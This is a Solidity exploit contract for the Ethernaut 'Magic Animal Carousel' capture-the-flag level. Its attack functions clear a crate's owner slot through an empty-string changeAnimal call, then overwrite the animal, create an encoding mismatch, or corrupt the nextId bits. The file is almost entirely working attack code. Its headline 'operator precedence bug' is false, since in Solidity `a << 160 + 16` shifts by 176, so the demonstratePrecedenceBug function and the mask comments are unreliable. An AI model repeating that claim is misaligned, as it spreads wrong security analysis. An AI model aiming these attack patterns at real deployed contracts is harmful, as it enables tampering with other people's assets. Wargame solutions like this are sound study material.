// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

/**
 * @title MagicAnimalCarouselAttack
 * @notice Exploit contract for Ethernaut Level 33 - Magic Animal Carousel
 * 
 * VULNERABILITY SUMMARY:
 * 
 * 1. OPERATOR PRECEDENCE BUG:
 *    In setAnimalAndSpin: `encodedAnimal << 160 + 16`
 *    Evaluates as: `(encodedAnimal << 160) + 16` (NOT `encodedAnimal << 176`)
 *    This places the animal in bits [160-255] instead of [176-255], overlapping with nextId!
 * 
 * 2. ENCODING INCONSISTENCY:
 *    - setAnimalAndSpin: `encodeAnimalName(animal) >> 16` (80-bit result)
 *    - changeAnimal: `encodeAnimalName(animal)` (96-bit result, no >> 16)
 *    Different encoding = different stored values for same animal name!
 * 
 * 3. OWNER BYPASS:
 *    - changeAnimal with empty string clears the owner slot
 *    - After clearing, ANYONE can change the animal in that crate
 *    - This breaks the invariant that "the same animal must be there"
 * 
 * 4. NEXTID MANIPULATION:
 *    - For 12-character names, low 16 bits of encodedAnimal overlap with nextId
 *    - `encodedAnimal << 160` places bits [0-15] into nextId position [160-175]
 *    - OR operation corrupts nextId, potentially creating carousel loops
 * 
 * EXPLOIT STRATEGY:
 * 1. Add an animal to the carousel using setAnimalAndSpin
 * 2. Clear the owner using changeAnimal with empty string
 * 3. Change the animal using changeAnimal with a different name
 * 4. The original animal is no longer there - rule broken!
 */

interface IMagicAnimalCarousel {
    function setAnimalAndSpin(string calldata animal) external;
    function changeAnimal(string calldata animal, uint256 crateId) external;
    function encodeAnimalName(string calldata animalName) external pure returns (uint256);
    function currentCrateId() external view returns (uint256);
    function carousel(uint256 crateId) external view returns (uint256);
    function MAX_CAPACITY() external view returns (uint16);
}

contract MagicAnimalCarouselAttack {
    IMagicAnimalCarousel public target;
    
    // Masks for decoding crate data (matching the target contract)
    uint256 constant ANIMAL_MASK = uint256(type(uint80).max) << 160 + 16; // Note: buggy mask from original
    uint256 constant NEXT_ID_MASK = uint256(type(uint16).max) << 160;
    uint256 constant OWNER_MASK = uint256(type(uint160).max);
    
    // Correct masks for analysis
    uint256 constant CORRECT_ANIMAL_MASK = uint256(type(uint80).max) << 176;
    
    event AnimalAdded(uint256 indexed crateId, string animal, uint256 encodedAnimal);
    event OwnerCleared(uint256 indexed crateId);
    event AnimalChanged(uint256 indexed crateId, string newAnimal);
    event AttackComplete(uint256 indexed crateId, string originalAnimal, string newAnimal);
    
    constructor(address _target) {
        target = IMagicAnimalCarousel(_target);
    }
    
    /**
     * @notice Execute the full attack to break the carousel rule
     * @param originalAnimal The animal to initially add
     * @param newAnimal The animal to replace it with
     */
    function attack(string calldata originalAnimal, string calldata newAnimal) external {
        // Step 1: Add the original animal to the carousel
        target.setAnimalAndSpin(originalAnimal);
        uint256 crateId = target.currentCrateId();
        
        emit AnimalAdded(crateId, originalAnimal, target.encodeAnimalName(originalAnimal));
        
        // Step 2: Clear the owner by calling changeAnimal with empty string
        target.changeAnimal("", crateId);
        emit OwnerCleared(crateId);
        
        // Step 3: Change the animal (anyone can do this now!)
        target.changeAnimal(newAnimal, crateId);
        emit AnimalChanged(crateId, newAnimal);
        
        emit AttackComplete(crateId, originalAnimal, newAnimal);
    }
    
    /**
     * @notice Alternative attack exploiting the encoding inconsistency
     * @dev setAnimalAndSpin uses >> 16 extra shift, changeAnimal doesn't
     */
    function attackEncodingMismatch(string calldata animal) external {
        // Add animal via setAnimalAndSpin (uses >> 16)
        target.setAnimalAndSpin(animal);
        uint256 crateId = target.currentCrateId();
        
        // Get the stored value
        uint256 storedBefore = target.carousel(crateId);
        
        // Clear owner
        target.changeAnimal("", crateId);
        
        // Replace with same animal name but different encoding (no >> 16)
        target.changeAnimal(animal, crateId);
        
        // The crate now has different encoded animal bits!
        uint256 storedAfter = target.carousel(crateId);
        
        // They should be different due to encoding mismatch
        require(storedBefore != storedAfter, "Encoding should differ");
    }
    
    /**
     * @notice Attack by manipulating nextId using 12-char name
     * @dev Low 16 bits of encoded 12-char name OR into nextId position
     */
    function attackNextIdManipulation(string calldata animal12chars) external {
        require(bytes(animal12chars).length == 12, "Need exactly 12 chars");
        
        // First create a crate
        target.setAnimalAndSpin("InitAnimal");
        uint256 crateId = target.currentCrateId();
        
        // Get current nextId
        uint256 crateBefore = target.carousel(crateId);
        uint256 nextIdBefore = (crateBefore & NEXT_ID_MASK) >> 160;
        
        // Clear owner
        target.changeAnimal("", crateId);
        
        // Change with 12-char name - this will corrupt nextId!
        target.changeAnimal(animal12chars, crateId);
        
        // Check new nextId
        uint256 crateAfter = target.carousel(crateId);
        uint256 nextIdAfter = (crateAfter & NEXT_ID_MASK) >> 160;
        
        // nextId should be corrupted (increased due to OR)
        require(nextIdAfter >= nextIdBefore, "NextId should be >= original");
    }
    
    /**
     * @notice Decode a crate to see its components
     */
    function decodeCrate(uint256 crateId) external view returns (
        address owner,
        uint256 nextId,
        uint256 animalBits,
        uint256 rawValue
    ) {
        uint256 crate = target.carousel(crateId);
        owner = address(uint160(crate & OWNER_MASK));
        nextId = (crate & NEXT_ID_MASK) >> 160;
        animalBits = (crate & ANIMAL_MASK) >> 176; // Using buggy mask shift
        rawValue = crate;
    }
    
    /**
     * @notice Compute what the low 16 bits of an encoded 12-char animal would be
     * @dev These bits will OR into the nextId position in changeAnimal
     */
    function computeLow16Bits(string calldata animal12chars) external pure returns (uint16) {
        require(bytes(animal12chars).length == 12, "Need exactly 12 chars");
        uint256 encoded = uint256(bytes32(abi.encodePacked(animal12chars)) >> 160);
        return uint16(encoded & 0xFFFF);
    }
    
    /**
     * @notice Get current state of the carousel
     */
    function getCarouselState() external view returns (
        uint256 currentCrate,
        uint256 currentCrateValue,
        address currentOwner,
        uint256 currentNextId
    ) {
        currentCrate = target.currentCrateId();
        currentCrateValue = target.carousel(currentCrate);
        currentOwner = address(uint160(currentCrateValue & OWNER_MASK));
        currentNextId = (currentCrateValue & NEXT_ID_MASK) >> 160;
    }
    
    /**
     * @notice Verify the operator precedence bug
     * @dev Shows that `a << b + c` equals `(a << b) + c`, not `a << (b + c)`
     */
    function demonstratePrecedenceBug() external pure returns (
        uint256 buggyResult,
        uint256 intendedResult,
        bool hasBug
    ) {
        uint256 testValue = 0x123456;
        
        // What the code does (buggy)
        buggyResult = testValue << 160 + 16;  // (testValue << 160) + 16
        
        // What was probably intended
        intendedResult = testValue << (160 + 16);  // testValue << 176
        
        hasBug = (buggyResult != intendedResult);
    }
}
